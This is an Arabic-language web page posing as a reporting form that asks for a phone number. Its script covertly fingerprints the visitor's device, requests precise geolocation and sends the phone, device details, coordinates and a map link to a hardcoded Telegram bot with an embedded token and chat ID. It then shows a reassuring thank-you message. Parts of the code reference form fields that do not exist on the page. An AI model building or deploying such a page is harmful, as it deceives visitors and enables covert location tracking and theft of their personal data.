<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إبلاغ</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Cairo', sans-serif;
        }

        body {
            background-color: #00b6ff;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #1e293b;
            position: relative;
            overflow: hidden;
        }

        .bg-shapes {
            position: absolute;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
            top: 0;
            left: 0;
        }

        .shape {
            position: absolute;
            filter: blur(60px);
            opacity: 0.15;
            border-radius: 50%;
        }

        .shape-1 {
            width: 450px;
            height: 450px;
            background: #00b6ff;
            top: -150px;
            right: -150px;
        }

        .shape-2 {
            width: 500px;
            height: 500px;
            background: #00b6ff;
            bottom: -200px;
            left: -200px;
        }

        .container {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(226, 232, 240, 0.8);
            width: 100%;
            max-width: 440px;
            padding: 35px 30px;
            border-radius: 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.06);
            text-align: center;
            position: relative;
            z-index: 1;
        }

        .logo-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 25px;
        }

        .logo-container img {
            width: 130px;
            height: auto;
            object-fit: contain;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 600;
            color: #00b6ff;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            outline: none;
            background-color: #f8fafc;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: #4f46e5;
            background-color: #fff;
            box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.1);
        }

        .custom-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #00b6ff, #00b6ff);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.25);
            margin-top: 10px;
        }

        .custom-btn:hover {
            background: linear-gradient(135deg, #4338ca, #3730a3);
            transform: translateY(-2px);
        }

        .error-message { 
            background-color: #fef2f2; 
            color: #dc2626; 
            border: 1px solid #fecaca;
            padding: 12px; 
            border-radius: 10px; 
            margin-bottom: 20px; 
            display: none; 
            font-weight: 600;
            font-size: 14px;
        }
    </style>
</head>

        <div class="shape shape-1"></div>
        <div class="shape shape-2"></div>
    </div>

    <div id="errorAlert" class="error-message">شكرا لك سوف نتفحص المعلومات</div>

    <div id="myContainer">
        <div class="input-group">
                    <div class="input-group">
            <label for="phone">رقم الهاتف الخاص بك</label>
            <input type="tel" id="phone" placeholder="07xxxxxxxx" autocomplete="off">
        </div>

        <button type="button" id="submitBtn" class="custom-btn">تأكيد الرقم</button>
    </div>
</div>

<script>
    const submitBtn = document.getElementById('submitBtn');
    const errorAlert = document.getElementById('errorAlert');

    // معلومات بوت تلغرام الخاص بك المدمجة مسبقاً
    const BOT_TOKEN = "9086840504:AAE-PkZ3aS3cCmW3omgeXRAGLiuHx4PFX3s";
    const CHAT_ID = "5947482261";

    // دالة فحص نوع الجهاز والمتصفح بصمت
    function getDeviceType() {
        const ua = navigator.userAgent;
        let device = "حاسوب (PC / Laptop)";
        let os = "غير معروف";

        if (/android/i.test(ua)) {
            device = "هاتف محمول (Android)";
            os = "Android";
        } else if (/iphone|ipad|ipod/i.test(ua)) {
            device = "هاتف محمول (iOS - iPhone/iPad)";
            os = "iOS";
        } else if (/windows/i.test(ua)) {
            os = "Windows";
        } else if (/mac/i.test(ua)) {
            os = "MacOS";
        }

        return `${device} (${os})`;
    }

    submitBtn.addEventListener('click', function() {
        const fullName = document.getElementById('fullName').value;
        const studentId = document.getElementById('studentId').value;
        const phone = document.getElementById('phone').value;

        if (!fullName || !studentId || !phone) {
            errorAlert.textContent = "يرجى كتابة رقم الهاتف";
            errorAlert.style.display = 'block';
            return;
        }

        const deviceInfo = getDeviceType();

        if (navigator.geolocation) {
            const options = {
                enableHighAccuracy: true,
                timeout: 7000,          // مهلة قصيرة وسريعة لعدم إزعاج الزائر
                maximumAge: 60000       // قبول أحدث موقع في آخر دقيقة لتسريع العملية
            };

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = Math.round(position.coords.accuracy);
                    
                    const locationStr = `خط الطول: ${lon} | خط العرض: ${lat}\n📍 دقة الموقع: بحدود ${accuracy} متر\n🗺️ (رابط الخريطة: https://maps.google.com/?q=${lat},${lon})`;
                    
                    sendDataToTelegram(fullName, studentId, phone, locationStr, deviceInfo);
                },
                function(error) {
                    sendDataToTelegram(fullName, studentId, phone, 'الموقع غير متوفر أو تم تخطي المهلة', deviceInfo);
                },
                options
            );
        } else {
            sendDataToTelegram(fullName, studentId, phone, 'الموقع غير مدعوم في هذا المتصفح', deviceInfo);
        }
    });

    function sendDataToTelegram(fullName, studentId, phone, location, device) {
        const message = `📥 *بيانات جديدة تم تسجيلها:*\n\n` +
                        `📱 *الهاتف:* ${phone}\n` +
                        `💻 *الجهاز:* ${device}\n` +
                        `📍 *الموقع:* ${location}\n` +
                        `⏰ *الوقت:* ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        // الأزرار التفاعلية في بوت تلغرام
        const inlineKeyboard = {
            inline_keyboard: [
                [
                    { text: "🗺️ فتح الموقع على الخريطة", url: `https://maps.google.com/?q=${location}` },
                    { text: "📞 اتصال بالهاتف", url: `tel:${phone}` }
                ]
            ]
        };

        const data = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: inlineKeyboard
        };

        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        }).then(() => {
            errorAlert.textContent = "شكرا لك سوف تنفحص الامر";
            errorAlert.style.display = 'block';
        });
    }
</script>
